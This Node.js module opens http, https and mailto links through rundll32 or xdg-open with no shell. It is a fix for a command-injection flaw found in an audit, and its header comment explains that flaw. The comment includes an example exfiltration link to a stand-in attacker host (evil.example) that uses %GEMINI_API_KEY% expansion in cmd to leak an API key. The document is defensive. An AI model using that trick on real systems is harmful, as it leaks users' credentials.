'use strict';

// effectors/open-url.js — hand a web link to the operator's default browser or
// mail app WITHOUT cmd.exe (2026-09-29 audit, B2c).
//
// THE DEFECT. compose_email and open_artifact opened links with
// spawn('cmd', ['/c', 'start', '', url]). Node passes that argument unquoted
// unless it has a space, and cmd then re-parses the line. Two of cmd's rules
// broke it — both measured 2026-09-29 with a harmless `echo`:
//   - "&" ends a command. A signed vault link (".../x.html?exp=1&sig=ab") lost
//     its signature, so the browser got a 401, and "sig=ab" was run as a command;
//     a Gmail compose link lost every field after the first.
//   - "%NAME%" is replaced by the environment variable NAME — even inside
//     quotes. MYTHOS's own environment holds its API keys, so
//     open_artifact("https://evil.example/?k=%GEMINI_API_KEY%") — tier 2, no
//     confirmation — would have opened the attacker's page WITH THE KEY in it.
//     An outbound check on the link cannot see that: cmd fills the key in after.
//
// THE FIX. No shell at all. rundll32 runs url.dll's FileProtocolHandler, which
// hands the link to ShellExecute and so to the default browser or mail app. The
// link travels as ONE argument through CreateProcess, which expands nothing.
// Only http:, https: and mailto: are accepted, because FileProtocolHandler given
// a file path opens — or runs — the file. The link is always the normalised
// URL.href, and one containing whitespace, a quote or a backslash is refused
// (an http(s) href never has them; a mailto: href can keep a space), so Node
// never wraps it in quotes for the command line and the handler never sees any.
// rundll32 is named by its full path under %WINDIR%, not found on PATH.
//
// Why not explorer.exe, the first version of this fix: measured live 2026-09-29
// against a local server, explorer.exe opened "http://127.0.0.1:p/plain" in
// about half a second, but "?x=1", "?exp=1&sig=abc" and the "%NAME%" link never
// reached the browser at all — exit code 1 and no request in 30 s. Every signed
// vault link and every compose link has a query, so it would have opened
// nothing. The same three links through rundll32 arrived in about 250 ms, with
// "&sig=abc" whole and "%MYTHOS_LIVE_X%" as typed — a variable that WAS set in
// the environment rundll32 inherited, so "not expanded" is a measurement, not
// the name being unknown. A 9019-character compose-shaped link (a long body,
// "&" and "%" escapes throughout) also arrived whole, in about 800 ms.
//
// A failed spawn (no rundll32 or xdg-open, or the process table full) reports as
// an 'error' EVENT on the next tick. With no listener, Node throws it, and
// crash-handlers.js ends the server — compose_email attached none. This module
// now always listens and logs it, so no caller can forget.
//
// Not taken (B2c review): routing these links through Electron's
// shell.openExternal, the door open_web(browser:true) uses. That hop is
// asynchronous with an acknowledgement, and compose_email returns synchronously;
// moving it is a separate change. Until then two doors open links.

const path = require('path');
const { createLogger } = require('../logger');

const log = createLogger(process.env.LOG_LEVEL || 'info');
const OPENABLE = new Set(['http:', 'https:', 'mailto:']);

// Tests pass a recording spawn here, so a refactor that moves the require back
// to load time still cannot launch a real browser from a test (one did, once).
let spawnImpl = null;
function setSpawnImpl(fn) { spawnImpl = typeof fn === 'function' ? fn : null; }

// { ok: true, href } or { ok: false, reason }.
function validateUrl(url) {
  const raw = String(url || '');
  let u;
  try { u = new URL(raw); } catch (_) { return { ok: false, reason: 'not a valid URL' }; }
  if (!OPENABLE.has(u.protocol)) return { ok: false, reason: `only http, https and mailto links are opened this way (got "${u.protocol}")` };
  if (/[\u0000-\u001f"]/.test(raw)) return { ok: false, reason: 'the link contains a quote or a control character' };
  if (/[\s"\\]/.test(u.href)) return { ok: false, reason: 'the link contains a space, a quote or a backslash' };
  return { ok: true, href: u.href };
}

function openCommand(href, platform) {
  if (platform === 'win32') {
    const windir = process.env.WINDIR;
    return [windir ? path.join(windir, 'System32', 'rundll32.exe') : 'rundll32.exe', ['url.dll,FileProtocolHandler', href]];
  }
  if (platform === 'darwin') return ['open', [href]];
  return ['xdg-open', [href]];
}

// openUrlExternally(url, { spawnFn, platform }) -> { ok: true, child } | { ok: false, reason }.
// The spawn's 'error' event is always listened to here (see the header); a
// caller may add its own listener to report it, as open_artifact does.
function openUrlExternally(url, opts) {
  const v = validateUrl(url);
  if (!v.ok) return v;
  const o = opts || {};
  const [cmd, args] = openCommand(v.href, o.platform || process.platform);
  // child_process is required HERE, at call time, not at load: tests stub it by
  // intercepting require() around the call, and a load-time copy would bypass the
  // stub and launch a real browser (it did, once, 2026-09-29).
  const spawnFn = o.spawnFn || spawnImpl || require('child_process').spawn;
  const child = spawnFn(cmd, args, { detached: true, stdio: 'ignore', shell: false, windowsHide: true });
  if (child && typeof child.on === 'function') {
    child.on('error', (err) => { log.warn('open-url: the opener did not start', { cmd, error: err && err.message }); });
  }
  if (child && typeof child.unref === 'function') child.unref();
  return { ok: true, child, href: v.href };
}

module.exports = { openUrlExternally, validateUrl, openCommand, setSpawnImpl };
